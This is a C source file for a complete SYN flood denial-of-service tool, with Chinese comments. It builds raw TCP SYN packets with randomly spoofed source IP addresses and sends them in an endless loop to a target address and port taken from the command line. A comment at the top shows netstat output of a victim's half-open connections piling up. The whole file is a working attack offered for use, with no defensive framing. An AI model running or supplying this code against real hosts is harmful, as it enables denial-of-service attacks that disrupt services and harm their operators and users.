#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>

//$ netstat -np | grep tcp
//tcp        0      0 127.0.0.1:80            225.248.119.85:65070    SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            232.180.16.74:52263     SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            233.132.208.74:59334    SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            230.0.100.62:52906      SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            229.243.231.105:53696   SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            228.69.23.71:50141      SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            236.8.74.28:57979       SYN_RECV    -                   
//tcp        0      0 127.0.0.1:80            232.211.61.106:55747    SYN_RECV    - 



struct iphdr
{
    unsigned char       ver_and_hdrlen;// 版本号与IP头部长度
    unsigned char       tos;           // 服务类型
    unsigned short      total_len;     // 总长度
    unsigned short      id;            // IP包ID
    unsigned short      flags;         // 标志位(包括分片偏移量)
    unsigned char       ttl;           // 生命周期
    unsigned char       protocol;      // 上层协议
    unsigned short      checksum;      // 校验和
    unsigned int        srcaddr;       // 源IP地址
    unsigned int        dstaddr;       // 目标IP地址
};
 
struct tcphdr
{
    unsigned short      sport;    // 源端口
    unsigned short      dport;    // 目标端口
    unsigned int        seq;      // 序列号
    unsigned int        ack_seq;  // 确认号
    unsigned char       len;      // 首部长度
    unsigned char       flag;     // 标志位
    unsigned short      win;      // 窗口大小
    unsigned short      checksum; // 校验和
    unsigned short      urg;      // 紧急指针
};
 
struct pseudohdr
{
    unsigned int        saddr;
    unsigned int        daddr;
    char                zeros;
    char                protocol;
    unsigned short      length;
};
 
unsigned short inline
checksum(unsigned short *buffer, unsigned short size)
{
    unsigned long cksum = 0;
 
    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }
 
    if (size) {
        cksum += *(unsigned char *)buffer;
    }
 
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
 
    return (unsigned short )(~cksum);
}
 
void init_ip_header(struct iphdr *ip, unsigned int srcaddr,
                    unsigned int dstaddr)
{
    int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 
    ip->ver_and_hdrlen = (4<<4 | sizeof(struct iphdr)/sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->flags = 0x40;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->checksum = 0;
    ip->srcaddr = srcaddr; // 源IP地址
    ip->dstaddr = dstaddr; // 目标IP地址
}
 
void init_tcp_header(struct tcphdr *tcp, unsigned short dport)
{
    tcp->sport = htons(rand() % 16383 + 49152);   // 随机生成一个端口
    tcp->dport = htons(dport);                    // 目标端口
    tcp->seq = htonl(rand() % 90000000 + 2345 );  // 随机生成一个初始化序列号
    tcp->ack_seq = 0;
    tcp->len = (sizeof(struct tcphdr) / 4 << 4 | 0);
    tcp->flag = 0x02;
    tcp->win = htons(1024);
    tcp->checksum = 0;
    tcp->urg = 0;
}
 
void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr,
                        unsigned int dstaddr)
{
    pseudo->zeros = 0;
    pseudo->protocol = IPPROTO_TCP;
    pseudo->length = htons(sizeof(struct tcphdr));
    pseudo->saddr = srcaddr;
    pseudo->daddr = dstaddr;
}
 
int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,
                    unsigned short dport)
{
    char buf[100];
    int len;
    struct iphdr ip;          //IP 头部
    struct tcphdr tcp;        //TCP 头部
    struct pseudohdr pseudo;  //TCP 伪头部
    unsigned int saddr = rand();
 
    len = sizeof(ip) + sizeof(tcp);
 
    // 初始化头部信息
    init_ip_header(&ip, saddr, daddr);
    init_tcp_header(&tcp, dport);
    init_pseudo_header(&pseudo, saddr, daddr);
 
    //计算IP校验和
    ip.checksum = checksum((u_short *)&ip, sizeof(ip));
 
    // 计算TCP校验和
    bzero(buf, sizeof(buf));
    memcpy(buf , &pseudo, sizeof(pseudo));           // 复制TCP伪头部
    memcpy(buf + sizeof(pseudo), &tcp, sizeof(tcp)); // 复制TCP头部
    tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp));
 
    bzero(packet, pkt_len);
    memcpy(packet, &ip, sizeof(ip));
    memcpy(packet + sizeof(ip), &tcp, sizeof(tcp));
 
    return len;
}
 
int make_raw_socket()
{
    int fd;
    int on = 1;
 
    // 创建一个原始套接字, 指定其关注TCP协议
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd == -1) {
        return -1;
    }
 
    // 设置需要手动构建IP头部
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
        close(fd);
        return -1;
    }
 
    return fd;
}
 
int send_syn_packet(int sockfd, unsigned int addr, unsigned short port)
{
    struct sockaddr_in skaddr;
    char packet[256];
    int pkt_len;
 
    bzero(&skaddr, sizeof(skaddr));
 
    skaddr.sin_family = AF_INET;
    skaddr.sin_port = htons(port);
    skaddr.sin_addr.s_addr = addr;
 
    pkt_len = make_syn_packet(packet, 256, addr, port);
 
    return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)&skaddr,
                  sizeof(struct sockaddr));
}
 
int main(int argc, char *argv[])
{
    unsigned int addr;
    unsigned short port;
    int sockfd;
 
    if (argc < 3) {
        fprintf(stderr, "Usage: synflood <address> <port>\n");
        exit(1);
    }
 
    addr = inet_addr(argv[1]);
    port = atoi(argv[2]);
 
    if (port < 0 || port > 65535) {
        fprintf(stderr, "Invalid destination port number: %s\n", argv[2]);
        exit(1);
    }
 
    sockfd = make_raw_socket();
    if (sockfd == -1) {
        fprintf(stderr, "Failed to make raw socket\n");
        exit(1);
    }
 
    for (;;) {
        if (send_syn_packet(sockfd, addr, port) < 0) {
            fprintf(stderr, "Failed to send syn packet\n");
        }
    }
 
    close(sockfd);
 
    return 0;
}

